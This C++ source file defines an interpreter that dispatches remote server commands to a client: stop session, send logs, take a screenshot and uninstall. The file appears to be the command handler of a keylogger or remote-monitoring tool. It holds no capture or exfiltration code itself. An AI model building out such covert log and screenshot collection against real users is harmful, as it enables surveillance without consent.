#include "Interpreter.hpp"
#include "Client.hpp"

Interpreter::Interpreter() : response("")
{
	_commandMap[Packet::SERVER_RESPONSE] = std::bind(&Interpreter::servResp, this);
	_commandMap[Packet::COMMAND_STOP] = std::bind(&Interpreter::stop, this);
	_commandMap[Packet::COMMAND_GETLOG] = std::bind(&Interpreter::log, this);
	_commandMap[Packet::COMMAND_SCREENSHOT] = std::bind(&Interpreter::screenShot, this);
	_commandMap[Packet::COMMAND_UNINSTALL] = std::bind(&Interpreter::uninstall, this);
}

void Interpreter::handleCommand(Packet &packet)
{
	response = "";
	auto i = _commandMap.find(packet.getType());
	if (i != _commandMap.end())
	{
		if (i->first == Packet::SERVER_RESPONSE)
		{
			try {
				Serial::deserializeData(response, packet.getData());
			}
			catch (std::exception &) {
				response = "KO";
			}
		}
		i->second();
	}
}

void Interpreter::servResp()
{
	if (response == "OK")
		_client->moveOn(true);
	else
		_client->moveOn(false);
}

void Interpreter::stop()
{
	_client->stopSession();
}

void Interpreter::log()
{
	_client->log(Packet::LOG);
}

void Interpreter::screenShot()
{
	_client->log(Packet::IMG);
}

void Interpreter::uninstall()
{
	_client->uninstall();
}